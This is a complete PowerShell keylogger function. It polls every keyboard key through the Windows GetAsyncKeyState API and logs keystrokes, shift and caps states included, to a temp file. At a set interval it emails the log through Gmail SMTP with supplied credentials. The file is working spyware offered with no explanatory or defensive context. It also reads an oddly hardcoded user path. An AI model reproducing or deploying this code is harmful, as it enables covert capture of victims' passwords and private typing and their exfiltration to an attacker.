function Run-Keylogger {

param($gmail,$password,$period)

$numValues = 96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,32
$numKeys = '0','1','2','3','4','5','6','7','8','9','*','+','|','-','.','/'," "
$values = 48,49,50,51,52,53,54,55,56,57,186,187,188,189,190,191,192,219,220,221,222
$defaultKeys = '0','1','2','3','4','5','6','7','8','9',';','=',',','-','.','/','~','[','\',']',"'"
$shiftedKeys = ')','!','@','#','$','%','^','&','*','(',':','+','<','_','>','?','~','{','|','}','"'
$specialValues = 44,45,36,46,35,33,34,27,144,20,9,8,13,37,38,39,40,164,165,91,92,162,163,173,174,175,176,177,178,179,180
$specialKeys = '<Print Screen>','<Insert>','<Home>','<Delete>','<End>','<Page Up>','<Page Down>','<Esc>','<Num Lock>','<Caps Lock>','<Tab>','<Backspace>','<Enter>','<Left>','<Up>','<Right>','<Down>','<Alt>','<Alt>','<Windows>','<Windows>','<Ctrl>','<Ctrl>','<F1>','<F2>','<F3>','<F4>','<F5>','<F6>','<F7>','<F8>'

$path = "$env:temp\log.txt"
New-Item $path

$signature = @"
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
public static extern short GetAsyncKeyState(int virtualKeyCode);
"@

$getKeyState = Add-Type -memberDefinition $signature -name "Newtype" -namespace newnamespace -passThru

$startDate = Get-Date
$sDate = Get-Date -Format "MM/dd/yyyy - HH:mm:ss"
Set-Content $path "Keylog"
Add-Content $path $sDate
Add-Content $path ""

$SMTPServer = 'smtp.gmail.com'
$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
$SMTPInfo.EnableSsl = $true
$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential($gmail, $password)

$caps = 0

while($true){
  $endDate = Get-Date
  $diff = $endDate - $startDate
  $min = $diff.TotalMinutes
  Write-Output $sec
  if($min -ge $period){
    $content = Get-Content 'C:\users\hilld\file.txt'
    if($content.Count -ne 3 -Or $content[2] -ne ''){
      $eDate = Get-Date -Format "MM/dd/yyyy - HH:mm:ss"
      Add-Content $path $eDate
      $ReportEmail = New-Object System.Net.Mail.MailMessage
      $ReportEmail.From = $gmail
      $ReportEmail.To.Add($gmail)
      $ReportEmail.Subject = 'Keylog - ' + $sDate + '-' + $eDate
      $ReportEmail.Attachments.Add($path)
      $SMTPInfo.Send($ReportEmail)
      $ReportEmail.Dispose()
    }
    $startDate = Get-Date
    $sDate = Get-Date -Format "MM/dd/yyyy - HH:mm:ss"
    Set-Content $path "Keylog"
    Add-Content $path $sDate
    Add-Content $path ""
  }
  $shift1 = $getKeyState::GetAsyncKeyState(160)
  $shift2 = $getKeyState::GetAsyncKeyState(161)
  $shift = 0
  $shiftUsed = 0
  if($shift1 -eq -32767 -Or $shift2 -eq -32767 -Or $shift1 -eq -32768 -Or $shift2 -eq -32768){
    $shift = 1
  }
  for($index=65;$index -le 90; $index++){
    $logged = $getKeyState::GetAsyncKeyState($index)
    if($logged -eq -32767){
      if($shift){
        if($caps){
          $key = [String]::new([char]($index+32))
        }
        else{
          $key = [String]::new([char]$index)
        }
        $shiftUsed = 1
      }
      else{
        if($caps){
          $key = [String]::new([char]$index)
        }
        else{
          $key = [String]::new([char]($index+32))
        }
      }
      $oldContent = Get-Content $path
      $lastLine = $oldContent[$oldContent.Count-1]
      $keepContent = $oldContent[0 .. ($oldContent.Count-2)]
      Set-Content $path $keepContent
      $newContent = $lastLine+$key
      Add-Content $path $newContent
    }
  }
  for($count=0;$count -le 20; $count++){
    $index = $values[$count]
    $logged = $getKeyState::GetAsyncKeyState($index)
    if($logged -eq -32767){
      if($shift){
        $key = [String]::new($shiftedKeys[$count])
        $shiftUsed = 1
      }
      else{
        $key = [String]::new($defaultKeys[$count])
      }
      $oldContent = Get-Content $path
      $lastLine = $oldContent[$oldContent.Count-1]
      $keepContent = $oldContent[0 .. ($oldContent.Count-2)]
      Set-Content $path $keepContent
      $newContent = $lastLine+$key
      Add-Content $path $newContent
    }
  }
  for($count=0;$count -le 16; $count++){
    $index = $numValues[$count]
    $logged = $getKeyState::GetAsyncKeyState($index)
    if($logged -eq -32767){
      $key = $numKeys[$count]
      $oldContent = Get-Content $path
      $lastLine = $oldContent[$oldContent.Count-1]
      $keepContent = $oldContent[0 .. ($oldContent.Count-2)]
      Set-Content $path $keepContent
      $newContent = $lastLine+$key
      Add-Content $path $newContent
    }
  }
  for($count=0;$count -le 30; $count++){
    $index = $specialValues[$count]
    $logged = $getKeyState::GetAsyncKeyState($index)
    if($logged -eq -32767){
      $key = $specialKeys[$count]
      Add-Content $path $key
      if($count -eq 9){
        if($caps -eq 0){
          $caps = 1
        }
        else{
          $caps = 0
        }
      }
    }
  }
  Start-Sleep -m 20
}
}
